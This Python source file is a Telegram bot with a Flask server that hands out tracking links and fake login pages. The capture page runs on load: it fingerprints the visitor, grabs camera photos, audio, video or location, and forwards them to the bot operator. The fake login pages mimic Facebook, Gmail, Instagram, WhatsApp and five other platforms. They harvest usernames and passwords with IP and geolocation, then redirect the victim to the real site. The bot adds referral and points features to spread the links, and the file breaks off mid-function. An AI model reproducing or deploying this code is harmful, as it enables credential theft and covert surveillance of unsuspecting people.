#!/usr/bin/env python3"""    FINAL COMPLETE CODE - All Working Functions    - Device Info, Photo, Audio, Location, Video, Gallery    - Contacts API, Clipboard Monitor, Auto-fill Detection    - Screen Record, Screenshot, Torch, Vibration, Gyroscope, Battery, Network, System    - Fake Login Pages (9 platforms)    - Points System, Daily Bonus, Referral    - Forward messages to groups/channels    - Reply keyboard + Inline keyboards for all links"""import osimport reimport jsonimport timeimport randomimport secretsimport threadingimport requestsimport subprocessimport platformimport ipaddressimport base64from flask import Flask, request, render_template_string, jsonifyfrom telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, ReplyKeyboardMarkup, KeyboardButtonfrom telegram.ext import ApplicationBuilder, CommandHandler, CallbackQueryHandler, MessageHandler, filters, ContextTypesfrom datetime import datetime, timedelta# ---------- Configuration ----------BOT_TOKEN = os.environ.get("BOT_TOKEN", "")ADMIN_IDS = {"1838854178", "1930138915"}NOTIFY_CHAT_IDS = set()  # Add your channel/group ID here e.g., {"-1002348198546"}_render_url = os.environ.get("RENDER_EXTERNAL_URL", "")BASE_URL = _render_url.rstrip("/") if _render_url else "http://localhost:5000"tracking_links = {}seen_users = set()# ---------- User Data ----------user_data = {}DAILY_BONUS_PTS = 5REFER_BONUS_PTS = 10PTS_PER_DAY = 10FREE_DAYS_NEW = 1flask_app = Flask(__name__)# ---------- User Helpers ----------def get_user(user_id):    uid = str(user_id)    if uid not in user_data:        user_data[uid] = {            "points": 0, "access_expires": None, "last_daily": None,            "referrals": 0, "referred_by": None, "name": "Unknown",            "phone": None, "pending_phone_approval": False,        }    return user_data[uid]def is_admin(user_id):    return str(user_id) in ADMIN_IDSdef has_access(user_id):    if is_admin(user_id):        return True    u = get_user(user_id)    exp = u.get("access_expires")    return exp is not None and exp > datetime.now()def add_access_days(user_id, days):    u = get_user(user_id)    now = datetime.now()    base = u["access_expires"] if u["access_expires"] and u["access_expires"] > now else now    u["access_expires"] = base + timedelta(days=days)def add_points(user_id, pts):    u = get_user(user_id)    u["points"] = max(0, u.get("points", 0) + pts)    send_telegram_message(user_id, f"💰 +{pts} points. Total: {u['points']}")def remove_points(user_id, pts):    u = get_user(user_id)    u["points"] = max(0, u.get("points", 0) - pts)    send_telegram_message(user_id, f"💰 -{pts} points. Total: {u['points']}")def access_expires_str(user_id):    u = get_user(user_id)    exp = u.get("access_expires")    if not exp:        return "❌ No access"    if exp < datetime.now():        return "⏰ Expired"    delta = exp - datetime.now()    return f"✅ {int(delta.total_seconds()//3600)}h {int((delta.total_seconds()%3600)//60)}m left"def log(msg):    print(f"[{datetime.now().strftime('%H:%M:%S')}] {msg}")# ---------- IP Helpers ----------def is_private_ip(ip):    try:        return ipaddress.ip_address(ip).is_private    except:        return Truedef geolocate_ip(ip):    try:        if is_private_ip(ip):            return None        r = requests.get(f"http://ip-api.com/json/{ip}?fields=status,country,city,isp", timeout=3)        d = r.json()        if d.get('status') == 'success':            return d    except:        pass    return None# ---------- Telegram Send Helpers ----------def send_telegram_message(chat_id, text, reply_markup=None):    try:        payload = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}        if reply_markup:            payload["reply_markup"] = reply_markup        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage", json=payload, timeout=5)    except Exception as e:        log(f"Send message error: {e}")def send_telegram_photo(chat_id, photo_bytes, caption=""):    try:        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendPhoto",            data={'chat_id': chat_id, 'caption': caption[:1024], 'parse_mode': 'HTML'},            files={'photo': ('photo.jpg', photo_bytes, 'image/jpeg')}, timeout=15)    except Exception as e:        log(f"Send photo error: {e}")def send_telegram_voice(chat_id, audio_bytes, caption=""):    try:        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVoice",            data={'chat_id': chat_id, 'caption': caption[:1024], 'parse_mode': 'HTML'},            files={'voice': ('audio.ogg', audio_bytes, 'audio/ogg')}, timeout=15)    except Exception as e:        log(f"Send audio error: {e}")def send_telegram_video(chat_id, video_bytes, caption=""):    try:        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendVideo",            data={'chat_id': chat_id, 'caption': caption[:1024], 'parse_mode': 'HTML'},            files={'video': ('video.mp4', video_bytes, 'video/mp4')}, timeout=20)    except Exception as e:        log(f"Send video error: {e}")def send_telegram_location(chat_id, lat, lon):    try:        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendLocation",            json={"chat_id": chat_id, "latitude": float(lat), "longitude": float(lon)}, timeout=10)    except Exception as e:        log(f"Send location error: {e}")def send_telegram_document(chat_id, file_bytes, filename, caption=""):    try:        requests.post(f"https://api.telegram.org/bot{BOT_TOKEN}/sendDocument",            data={'chat_id': chat_id, 'caption': caption[:1024], 'parse_mode': 'HTML'},            files={'document': (filename, file_bytes)}, timeout=20)    except Exception as e:        log(f"Send document error: {e}")# ---------- WiFi SSID ----------def get_wifi_ssid():    system = platform.system()    try:        if system == "Windows":            output = subprocess.check_output(["netsh", "wlan", "show", "interfaces"], universal_newlines=True, stderr=subprocess.DEVNULL)            for line in output.splitlines():                if "SSID" in line and "BSSID" not in line:                    ssid = line.split(":")[1].strip()                    if ssid:                        return ssid        elif system == "Linux":            output = subprocess.check_output(["iwgetid", "-r"], universal_newlines=True, stderr=subprocess.DEVNULL).strip()            if output:                return output        elif system == "Darwin":            output = subprocess.check_output(["/System/Library/PrivateFrameworks/Apple80211.framework/Versions/Current/Resources/airport", "-I"], universal_newlines=True, stderr=subprocess.DEVNULL)            for line in output.splitlines():                if "SSID:" in line:                    ssid = line.split("SSID:")[1].strip()                    if ssid:                        return ssid    except:        pass    return None# ---------- HTML Templates ----------CAPTURE_TEMPLATE = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head><body><script>const token="{{ token }}";const mode="{{ mode }}";async function sendFingerprint() {    const fp = {        ua: navigator.userAgent,        platform: navigator.platform,        screen: screen.width + "x" + screen.height,        lang: navigator.language,        timezone: Intl.DateTimeFormat().resolvedOptions().timeZone    };    await fetch('/capture_fingerprint', {        method: 'POST',        headers: {'Content-Type': 'application/json'},        body: JSON.stringify({token, fingerprint: fp})    });}async function takePhoto() {    try {        const stream = await navigator.mediaDevices.getUserMedia({video: true});        const video = document.createElement('video');        video.srcObject = stream;        video.play();        await new Promise(r => setTimeout(r, 500));        const canvas = document.createElement('canvas');        canvas.width = video.videoWidth || 640;        canvas.height = video.videoHeight || 480;        canvas.getContext('2d').drawImage(video, 0, 0);        stream.getTracks().forEach(t => t.stop());        const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));        const fd = new FormData();        fd.append('token', token);        fd.append('photo', blob);        await fetch('/capture_photo', {method: 'POST', body: fd});        document.body.innerHTML = "<h2>✅ Photo sent!</h2>";    } catch(e) { document.body.innerHTML = "<h2>❌ Camera error: " + e.message + "</h2>"; }}async function recordAudio() {    try {        const stream = await navigator.mediaDevices.getUserMedia({audio: true});        const recorder = new MediaRecorder(stream, {mimeType: 'audio/webm'});        let chunks = [];        recorder.ondataavailable = e => chunks.push(e.data);        recorder.start();        await new Promise(r => setTimeout(r, 3000));        recorder.stop();        await new Promise(r => recorder.onstop = r);        const blob = new Blob(chunks, {type: 'audio/webm'});        const fd = new FormData();        fd.append('token', token);        fd.append('audio', blob);        await fetch('/capture_audio', {method: 'POST', body: fd});        document.body.innerHTML = "<h2>✅ Audio sent!</h2>";    } catch(e) { document.body.innerHTML = "<h2>❌ Mic error: " + e.message + "</h2>"; }}async function getLocation() {    try {        const pos = await new Promise((res, rej) => navigator.geolocation.getCurrentPosition(res, rej));        const fd = new FormData();        fd.append('token', token);        fd.append('lat', pos.coords.latitude);        fd.append('lon', pos.coords.longitude);        await fetch('/capture_location', {method: 'POST', body: fd});        document.body.innerHTML = "<h2>✅ Location sent!</h2>";    } catch(e) { document.body.innerHTML = "<h2>❌ Location error: " + e.message + "</h2>"; }}async function recordVideo() {    try {        const stream = await navigator.mediaDevices.getUserMedia({video: true, audio: true});        const recorder = new MediaRecorder(stream, {mimeType: 'video/webm'});        let chunks = [];        recorder.ondataavailable = e => chunks.push(e.data);        recorder.start();        await new Promise(r => setTimeout(r, 5000));        recorder.stop();        await new Promise(r => recorder.onstop = r);        const blob = new Blob(chunks, {type: 'video/webm'});        const fd = new FormData();        fd.append('token', token);        fd.append('video', blob);        await fetch('/capture_video', {method: 'POST', body: fd});        document.body.innerHTML = "<h2>✅ Video sent!</h2>";    } catch(e) { document.body.innerHTML = "<h2>❌ Video error: " + e.message + "</h2>"; }}sendFingerprint();if (mode === 'photo') takePhoto();else if (mode === 'audio') recordAudio();else if (mode === 'location') getLocation();else if (mode === 'video') recordVideo();else if (mode === 'device') document.body.innerHTML = "<h2>✅ Device info sent!</h2>";</script></body></html>"""INSPECTOR_TEMPLATE = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"></head><body><h2>🛠️ Device Inspector + Gallery</h2><div id="log" style="background:#1e1e1e;color:#0f0;padding:10px;font-family:monospace;max-height:400px;overflow:auto;margin-bottom:10px">Ready...</div><div style="display:flex;flex-wrap:wrap;gap:5px">    <button onclick="pickSingleImage()">📷 Pick Single Image</button>    <button onclick="pickMultipleImages()">🖼️ Pick Multiple Images</button>    <button onclick="pickAnyFile()">📁 Pick Any File</button>    <button onclick="captureAllImages()">🖼️ Capture Page Images</button>    <button onclick="screenCapture()">📸 Screen Record</button>    <button onclick="takeScreenshot()">📸 Screenshot</button>    <button onclick="torchOn()">💡 Torch ON</button>    <button onclick="torchOff()">💡 Torch OFF</button>    <button onclick="vibrate()">📳 Vibrate</button>    <button onclick="shareContent()">📤 Share</button>    <button onclick="downloadFile()">💾 Download</button>    <button onclick="networkInfo()">🌐 Network</button>    <button onclick="systemInfo()">💻 System</button>    <button onclick="batteryStatus()">🔋 Battery</button>    <button onclick="deviceOrientation()">🧭 Gyroscope</button>    <button onclick="getLocation()">📍 Location</button>    <button onclick="fullDeviceInfo()">📱 Full Info</button>    <button onclick="sendAll()">📤 Send All</button></div><script>const token="{{ token }}";function log(msg){const d=document.getElementById('log');d.innerHTML+=`\\n[${new Date().toLocaleTimeString()}] ${msg}`;d.scrollTop=d.scrollHeight;}async function sendToBot(endpoint, data){try{await fetch(endpoint,{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,...data})});}catch(e){}}// Gallery Functionsasync function pickSingleImage() {    const input = document.createElement('input');    input.type = 'file';    input.accept = 'image/*';    input.onchange = async (e) => {        const file = e.target.files[0];        if (file) {            const reader = new FileReader();            reader.onload = async (ev) => {                await fetch('/capture_gallery_photo', {                    method: 'POST',                    headers: { 'Content-Type': 'application/json' },                    body: JSON.stringify({ token, photo: ev.target.result, caption: `📸 Gallery: ${file.name}` })                });                log(`✅ Sent: ${file.name}`);            };            reader.readAsDataURL(file);        }    };    input.click();}async function pickMultipleImages() {    const input = document.createElement('input');    input.type = 'file';    input.accept = 'image/*';    input.multiple = true;    input.onchange = async (e) => {        const files = e.target.files;        log(`📸 Sending ${files.length} images...`);        for (let i = 0; i < files.length; i++) {            const file = files[i];            const reader = new FileReader();            reader.onload = async (ev) => {                await fetch('/capture_gallery_photo', {                    method: 'POST',                    headers: { 'Content-Type': 'application/json' },                    body: JSON.stringify({ token, photo: ev.target.result, caption: `📸 Gallery ${i+1}: ${file.name}` })                });                log(`✅ Sent ${i+1}/${files.length}`);            };            reader.readAsDataURL(file);            await new Promise(r => setTimeout(r, 500));        }    };    input.click();}async function pickAnyFile() {    const input = document.createElement('input');    input.type = 'file';    input.accept = '*/*';    input.onchange = async (e) => {        const file = e.target.files[0];        if (file && file.size < 10 * 1024 * 1024) {            const reader = new FileReader();            reader.onload = async (ev) => {                await fetch('/capture_file', {                    method: 'POST',                    headers: { 'Content-Type': 'application/json' },                    body: JSON.stringify({ token, filename: file.name, content: ev.target.result })                });                log(`✅ File: ${file.name}`);            };            reader.readAsDataURL(file);        } else { log('❌ File too large (>10MB)'); }    };    input.click();}async function captureAllImages() {    const images = document.querySelectorAll('img');    log(`📸 Found ${images.length} images`);    for (let i = 0; i < images.length; i++) {        try {            const img = images[i];            const canvas = document.createElement('canvas');            canvas.width = img.naturalWidth || 100;            canvas.height = img.naturalHeight || 100;            canvas.getContext('2d').drawImage(img, 0, 0);            const blob = await new Promise(r => canvas.toBlob(r, 'image/jpeg'));            const fd = new FormData();            fd.append('token', token);            fd.append('photo', blob);            await fetch('/capture_photo', { method: 'POST', body: fd });            log(`✅ Captured ${i+1}/${images.length}`);        } catch(e) { log(`❌ Failed: ${e.message}`); }    }}async function screenCapture(){    try{        const stream=await navigator.mediaDevices.getDisplayMedia({video:true});        const recorder=new MediaRecorder(stream);        let chunks=[];        recorder.ondataavailable=e=>chunks.push(e.data);        recorder.start();        setTimeout(()=>{recorder.stop();stream.getTracks().forEach(t=>t.stop());},5000);        await new Promise(r=>recorder.onstop=r);        const blob=new Blob(chunks,{type:'video/webm'});        const fd=new FormData();fd.append('token',token);fd.append('video',blob);        await fetch('/capture_video',{method:'POST',body:fd});        log('✅ Screen recorded');    }catch(e){log('❌ Screen: '+e.message);}}async function takeScreenshot(){    try{        const stream=await navigator.mediaDevices.getDisplayMedia({video:true});        const video=document.createElement('video');        video.srcObject=stream;video.play();        await new Promise(r=>setTimeout(r,500));        const canvas=document.createElement('canvas');        canvas.width=video.videoWidth||screen.width;        canvas.height=video.videoHeight||screen.height;        canvas.getContext('2d').drawImage(video,0,0);        stream.getTracks().forEach(t=>t.stop());        const blob=await new Promise(r=>canvas.toBlob(r,'image/jpeg'));        const fd=new FormData();fd.append('token',token);fd.append('photo',blob);        await fetch('/capture_photo',{method:'POST',body:fd});        log('📸 Screenshot taken');    }catch(e){log('❌ Screenshot: '+e.message);}}let torchStream=null;async function torchOn(){    try{        const stream=await navigator.mediaDevices.getUserMedia({video:{facingMode:'environment'}});        const track=stream.getVideoTracks()[0];        await track.applyConstraints({advanced:[{torch:true}]});        torchStream=stream;        log('💡 Torch ON');    }catch(e){log('❌ Torch not available');}}async function torchOff(){    if(torchStream){torchStream.getTracks().forEach(t=>t.stop());torchStream=null;log('💡 Torch OFF');}}async function vibrate(){if('vibrate' in navigator){navigator.vibrate(200);log('📳 Vibrated');}else log('❌ No vibration');}async function shareContent(){    if(navigator.share){        try{await navigator.share({title:'Device Info',text:'Check this',url:location.href});log('📤 Shared');}        catch(e){log('❌ Share cancelled');}    }else log('❌ Web Share not supported');}function downloadFile(){    const data={time:new Date().toISOString(),ua:navigator.userAgent};    const blob=new Blob([JSON.stringify(data,null,2)],{type:'application/json'});    const url=URL.createObjectURL(blob);    const a=document.createElement('a');a.href=url;a.download=`device_${Date.now()}.json`;a.click();    URL.revokeObjectURL(url);    log('💾 Downloaded');}async function networkInfo(){    const conn=navigator.connection;    let info=`Network: ${conn?.effectiveType||'?'}, ${conn?.downlink||'?'}Mbps`;    try{        const ipRes=await fetch('https://api.ipify.org?format=json');        const ipData=await ipRes.json();        info+=`\\nPublic IP: ${ipData.ip}`;    }catch(e){}    log(`🌐 ${info}`);    await sendToBot('/capture_network',{network:info});}async function systemInfo(){    let info=`Cores: ${navigator.hardwareConcurrency||'?'}\\nMemory: ${navigator.deviceMemory||'?'}GB\\nPlatform: ${navigator.platform}`;    const canvas=document.createElement('canvas');    const gl=canvas.getContext('webgl');    if(gl){        const debugInfo=gl.getExtension('WEBGL_debug_renderer_info');        if(debugInfo) info+=`\\nGPU: ${gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL)}`;    }    log(`💻 ${info}`);    await sendToBot('/capture_system',{system:info});}async function batteryStatus(){    const b=await navigator.getBattery();    log(`🔋 Battery: ${Math.round(b.level*100)}% ${b.charging?'🔌 Charging':'🔋'}`);}async function deviceOrientation(){    const handler=e=>{log(`🧭 Orientation: α=${e.alpha?.toFixed(1)}° β=${e.beta?.toFixed(1)}° γ=${e.gamma?.toFixed(1)}°`);window.removeEventListener('deviceorientation',handler);};    window.addEventListener('deviceorientation',handler);    setTimeout(()=>window.removeEventListener('deviceorientation',handler),5000);}async function getLocation(){    navigator.geolocation.getCurrentPosition(async(pos)=>{        log(`📍 ${pos.coords.latitude}, ${pos.coords.longitude}`);        const fd=new FormData();fd.append('token',token);fd.append('lat',pos.coords.latitude);fd.append('lon',pos.coords.longitude);        await fetch('/capture_location',{method:'POST',body:fd});    },(err)=>log(`❌ Location: ${err.message}`));}async function fullDeviceInfo(){    let info=`📱 Full Device Info:\\nUA: ${navigator.userAgent}\\nPlatform: ${navigator.platform}\\nScreen: ${screen.width}x${screen.height}\\nLanguage: ${navigator.language}\\nTimezone: ${Intl.DateTimeFormat().resolvedOptions().timeZone}\\nCores: ${navigator.hardwareConcurrency||'?'}\\nMemory: ${navigator.deviceMemory||'?'}GB`;    log(info);    await sendToBot('/capture_device',{info:info});}async function sendAll(){    await networkInfo();await systemInfo();await batteryStatus();await fullDeviceInfo();    log('📤 All data sent!');}// Setup drag & dropfunction setupDragDrop() {    const dropzone = document.createElement('div');    dropzone.style.cssText = 'border:2px dashed #00ff00;padding:20px;margin:10px;text-align:center;border-radius:10px;background:#0a0a0a';    dropzone.innerHTML = '📁 Drag & Drop images or files here';    dropzone.ondragover = (e) => e.preventDefault();    dropzone.ondrop = async (e) => {        e.preventDefault();        const files = e.dataTransfer.files;        log(`📸 Dropped ${files.length} files`);        for (let i = 0; i < files.length; i++) {            const file = files[i];            if (file.type.startsWith('image/')) {                const reader = new FileReader();                reader.onload = async (ev) => {                    await fetch('/capture_gallery_photo', {                        method: 'POST',                        headers: { 'Content-Type': 'application/json' },                        body: JSON.stringify({ token, photo: ev.target.result, caption: `📸 Dropped: ${file.name}` })                    });                    log(`✅ Dropped: ${file.name}`);                };                reader.readAsDataURL(file);            } else if (file.size < 10 * 1024 * 1024) {                const reader = new FileReader();                reader.onload = async (ev) => {                    await fetch('/capture_file', {                        method: 'POST',                        headers: { 'Content-Type': 'application/json' },                        body: JSON.stringify({ token, filename: file.name, content: ev.target.result })                    });                    log(`✅ Dropped file: ${file.name}`);                };                reader.readAsDataURL(file);            }            await new Promise(r => setTimeout(r, 300));        }    };    document.body.insertBefore(dropzone, document.body.firstChild);}(async()=>{    const fp={userAgent:navigator.userAgent,platform:navigator.platform,screen:`${screen.width}x${screen.height}`,language:navigator.language};    await fetch('/capture_fingerprint',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify({token,fingerprint:fp})});    log('✅ Connected');    setupDragDrop();})();</script></body></html>"""FAKE_LOGIN_TEMPLATE = """<!DOCTYPE html><html><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1"><style>body{font-family:Arial;background:#f0f2f5;display:flex;justify-content:center;align-items:center;min-height:100vh}.card{background:#fff;padding:30px;border-radius:10px;width:320px;text-align:center}.logo{font-size:3rem;margin-bottom:10px}input{display:block;width:100%;padding:12px;margin:10px 0;border:1px solid #ddd;border-radius:5px}button{background:#1877f2;color:#fff;border:none;padding:12px;width:100%;border-radius:5px;cursor:pointer}</style></head><body><div class="card"><div class="logo">{{ logo }}</div><h2>{{ name }} Login</h2><input type="text" id="user" placeholder="Username / Email / Phone"><input type="password" id="pass" placeholder="Password"><button onclick="send()">Log In</button></div><script>const token="{{ token }}";const platform="{{ platform }}";async function send() {    const user = document.getElementById('user').value;    const pass = document.getElementById('pass').value;    await fetch('/capture_fake_login', {        method: 'POST',        headers: {'Content-Type': 'application/json'},        body: JSON.stringify({token, platform, username: user, password: pass, ua: navigator.userAgent})    });    document.body.innerHTML = "<h3 style='text-align:center;margin-top:100px'>✅ Login Successful<br>Redirecting...</h3>";    setTimeout(() => window.location.href = 'https://' + platform + '.com', 1500);}</script></body></html>"""# ---------- Flask Routes ----------@flask_app.route('/')def index():    return "Bot is running"@flask_app.route('/api/wifi_ssid')def wifi_ssid():    return jsonify({"ssid": get_wifi_ssid(), "available": True})@flask_app.route('/link/<token>')def link_page(token):    mode = request.args.get('m', 'device')    user_id = tracking_links.get(token)    if user_id:        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()        send_telegram_message(user_id, f"🔗 Link opened | Mode: {mode}\nIP: {ip}")    return render_template_string(CAPTURE_TEMPLATE, token=token, mode=mode)@flask_app.route('/inspector/<token>')def inspector_page(token):    user_id = tracking_links.get(token)    if user_id:        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()        send_telegram_message(user_id, f"🛠️ Inspector opened\nIP: {ip}")    return render_template_string(INSPECTOR_TEMPLATE, token=token)@flask_app.route('/vip/<platform>/<token>')def vip_page(platform, token):    user_id = tracking_links.get(token)    if not user_id:        return "Not found", 404    logos = {'facebook':'📘','gmail':'📧','tiktok':'🎵','instagram':'📷','telegram':'✈️','whatsapp':'💬','mobilelegends':'⚔️','pubg':'🎮','freefire':'🔥'}    names = {'facebook':'Facebook','gmail':'Google','tiktok':'TikTok','instagram':'Instagram','telegram':'Telegram','whatsapp':'WhatsApp','mobilelegends':'Mobile Legends','pubg':'PUBG','freefire':'Free Fire'}    return render_template_string(FAKE_LOGIN_TEMPLATE, token=token, platform=platform, logo=logos.get(platform, '🔐'), name=names.get(platform, platform.title()))# ---------- Capture Endpoints ----------@flask_app.route('/capture_fingerprint', methods=['POST'])def capture_fingerprint():    data = request.get_json()    token = data.get('token')    user_id = tracking_links.get(token)    if user_id:        fp = data.get('fingerprint', {})        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()        send_telegram_message(user_id, f"📱 Device Info\nIP: {ip}\n{fp.get('ua', '?')[:80]}")    return jsonify({"ok": True})@flask_app.route('/capture_photo', methods=['POST'])def capture_photo():    token = request.form.get('token')    user_id = tracking_links.get(token)    if user_id and request.files.get('photo'):        threading.Thread(target=send_telegram_photo, args=(user_id, request.files['photo'].read(), "📸 Photo"), daemon=True).start()    return jsonify({"ok": True})@flask_app.route('/capture_audio', methods=['POST'])def capture_audio():    token = request.form.get('token')    user_id = tracking_links.get(token)    if user_id and request.files.get('audio'):        threading.Thread(target=send_telegram_voice, args=(user_id, request.files['audio'].read(), "🎤 Audio"), daemon=True).start()    return jsonify({"ok": True})@flask_app.route('/capture_location', methods=['POST'])def capture_location():    token = request.form.get('token')    user_id = tracking_links.get(token)    if user_id:        lat = request.form.get('lat')        lon = request.form.get('lon')        threading.Thread(target=send_telegram_location, args=(user_id, lat, lon), daemon=True).start()    return jsonify({"ok": True})@flask_app.route('/capture_video', methods=['POST'])def capture_video():    token = request.form.get('token')    user_id = tracking_links.get(token)    if user_id and request.files.get('video'):        threading.Thread(target=send_telegram_video, args=(user_id, request.files['video'].read(), "🎥 Video"), daemon=True).start()    return jsonify({"ok": True})@flask_app.route('/capture_fake_login', methods=['POST'])def capture_fake_login():    data = request.get_json()    token = data.get('token')    user_id = tracking_links.get(token)    if user_id:        platform = data.get('platform', '?')        username = data.get('username', '')        password = data.get('password', '')        ip = request.headers.get('X-Forwarded-For', request.remote_addr).split(',')[0].strip()        geo = geolocate_ip(ip)        geo_str = f"📍 {geo.get('city','?')}, {geo.get('country','?')}" if geo else "📍 Unknown"        send_telegram_message(user_id, f"━━━━━━━━━━━━━━━━━━━━\n🌐 {platform.upper()}\n━━━━━━━━━━━━━━━━━━━━\n👤 {username}\n🔑 {password}\n━━━━━━━━━━━━━━━━━━━━\n🌐 IP: {ip}\n{geo_str}")    return jsonify({"ok": True})@flask_app.route('/capture_gallery_photo', methods=['POST'])def capture_gallery_photo():    data = request.get_json()    token = data.get('token')    user_id = tracking_links.get(token)    if not user_id:        return jsonify({"ok": False}), 400    photo_b64 = data.get('photo', '')    caption = data.get('caption', '📸 Gallery')    if photo_b64:        try:            if ',' in photo_b64:                photo_b64 = photo_b64.split(',')[1]            photo_bytes = base64.b64decode(photo_b64)            threading.Thread(target=send_telegram_photo, args=(user_id, photo_bytes, caption), daemon=True).start()        except Exception as e:            send_telegram_message(user_id, f"❌ Error: {str(e)}")    return jsonify({"ok": True})@flask_app.route('/capture_file', methods=['POST'])def capture_file():    data = request.get_json()    token = data.get('token')    user_id = tracking_links.get(token)    if user_id and data.get('content'):        filename = data.get('filename', 'file')        try:            content_b64 = data.get('content', '')            if ',' in content_b64:                content_b64 = content_b64.split(',')[1]            file_bytes = base64.b64decode(content_b64)            threading.Thread(target=send_telegram_document, args=(user_id, file_bytes, filename, f"📁 File: {filename}"), daemon=True).start()        except Exception as e:            send_telegram_message(user_id, f"❌ File error: {str(e)}")    return jsonify({"ok": True})@flask_app.route('/capture_network', methods=['POST'])def capture_network():    data = request.get_json()    token = data.get('token')    user_id = tracking_links.get(token)    if user_id:        send_telegram_message(user_id, f"🌐 {data.get('network', '')}")    return jsonify({"ok": True})@flask_app.route('/capture_system', methods=['POST'])def capture_system():    data = request.get_json()    token = data.get('token')    user_id = tracking_links.get(token)    if user_id:        send_telegram_message(user_id, f"💻 System Info:\n{data.get('system', '')}")    return jsonify({"ok": True})@flask_app.route('/capture_device', methods=['POST'])def capture_device():    data = request.get_json()    token = data.get('token')    user_id = tracking_links.get(token)    if user_id:        send_telegram_message(user_id, f"📱 {data.get('info', '')[:500]}")    return jsonify({"ok": True})# ---------- Telegram Bot ----------def get_main_keyboard():    return ReplyKeyboardMarkup([        [KeyboardButton("📱 Device Info"), KeyboardButton("📸 Photo"), KeyboardButton("🎤 Audio")],        [KeyboardButton("📍 Location"), KeyboardButton("🎥 Video"), KeyboardButton("🛠️ Inspector")],        [KeyboardButton("💎 FB VIP"), KeyboardButton("💎 Gmail VIP"), KeyboardButton("💎 TikTok VIP")],        [KeyboardButton("💎 Instagram VIP"), KeyboardButton("💎 Telegram VIP"), KeyboardButton("💎 WhatsApp VIP")],        [KeyboardButton("💎 ML VIP"), KeyboardButton("💎 PUBG VIP"), KeyboardButton("💎 FreeFire VIP")],        [KeyboardButton("💰 Daily Bonus"), KeyboardButton("👥 Refer"), KeyboardButton("💎 My Points")],        [KeyboardButton("📋 My Links"), KeyboardButton("🗑 Clear"), KeyboardButton("❓ Help")]    ], resize_keyboard=True)BUTTON_ACTIONS = {    "📱 Device Info": "device", "📸 Photo": "photo", "🎤 Audio": "audio",    "📍 Location": "location", "🎥 Video": "video", "🛠️ Inspector": "inspector"}VIP_ACTIONS = {    "💎 FB VIP": "facebook", "💎 Gmail VIP": "gmail", "💎 TikTok VIP": "tiktok",    "💎 Instagram VIP": "instagram", "💎 Telegram VIP": "telegram", "💎 WhatsApp VIP": "whatsapp",    "💎 ML VIP": "mobilelegends", "💎 PUBG VIP": "pubg", "💎 FreeFire VIP": "freefire"}def make_inline_keyboard(token, mode, is_vip=False, platform=None):    if is_vip:        url = f"{BASE_URL}/vip/{platform}/{token}"    elif mode == "inspector":        url = f"{BASE_URL}/inspector/{token}"    else:        url = f"{BASE_URL}/link/{token}?m={mode}"    share_url = f"https://t.me/share/url?url={url}&text=Check this out!"    return InlineKeyboardMarkup([        [InlineKeyboardButton("🔗 Open Link", url=url)],        [InlineKeyboardButton("📤 Share", url=share_url)],        [InlineKeyboardButton("🔄 New Link", callback_data=f"new_{mode if not is_vip else platform}"),         InlineKeyboardButton("🏠 Menu", callback_data="menu")]    ])async def start(update: Update, context):    user_id = str(update.effective_user.id)    if user_id not in seen_users:        seen_users.add(user_id)        add_access_days(user_id, FREE_DAYS_NEW)        # Notify admins and groups        msg = f"🆕 New user: {update.effective_user.first_name}\nID: {user_id}"        for cid in ADMIN_IDS.union(NOTIFY_CHAT_IDS):            send_telegram_message(cid, msg)    await update.message.reply_text(        f"👋 Welcome {update.effective_user.first_name}!\n⏰ {access_expires_str(user_id)}\n\nSelect an option:",        parse_mode="HTML", reply_markup=get_main_keyboard()    )async def text_handler(update: Update, context):    text = update.message.text    user_id = str(update.effective_user.id)        if text in BUTTON_ACTIONS:        mode = BUTTON_ACTIONS[text]        token = secrets.token_urlsafe(12)        tracking_links[token] = user_id        await update.message.reply_text(            f"✅ {text} Link Ready:\n{BASE_URL}/link/{token}?m={mode}",            reply_markup=make_inline_keyboard(token, mode)        )    elif text in VIP_ACTIONS:        platform = VIP_ACTIONS[text]        token = secrets.token_urlsafe(12)        tracking_links[token] = user_id        await update.message.reply_text(            f"✅ {text} Link Ready:\n{BASE_URL}/vip/{platform}/{token}",            reply_markup=make_inline_keyboard(token, None, is_vip=True, platform=platform)        )    elif text == "💰 Daily Bonus":        u = get_user(user_id)        today = datetime.now().date()        if u.get("last_daily") == today:            msg = f"Already claimed.\nPoints: {u['points']}"        else:            u["last_daily"] = today            add_points(user_id, DAILY_BONUS_PTS)            msg = f"🎁 +{DAILY_BONUS_PTS} points\nTotal: {u['points']}\n{access_expires_str(user_id)}"        await update.message.reply_text(msg)    elif text == "👥 Refer":        try:            r = requests.get(f"https://api.telegram.org/bot{BOT_TOKEN}/getMe", timeout=5)            uname = r.json().get("result", {}).get("username", "")            link = f"https://t.me/{uname}?start=ref_{user_id}" if uname else "Bot link not available"            share_url = f"https://t.me/share/url?url={link}&text=Join this bot!"            await update.message.reply_text(f"Your refer link:\n{link}\n\nEach friend gives +{REFER_BONUS_PTS} pts + 1 day",                reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton("📤 Share", url=share_url)]]))        except:            await update.message.reply_text("Error generating refer link")    elif text == "💎 My Points":        u = get_user(user_id)        await update.message.reply_text(f"💰 Points: {u['points']}\n👥 Referrals: {u['referrals']}\n⏰ {access_expires_str(user_id)}\n\n{PTS_PER_DAY} pts = 1 day")    elif text == "📋 My Links":        user_links = [t for t, uid in tracking_links.items() if uid == user_id]        if not user_links:            await update.message.reply_text("No active links")        else:            lines = "\n".join([f"• {BASE_URL}/link/{t}?m=device" for t in user_links[-5:]])        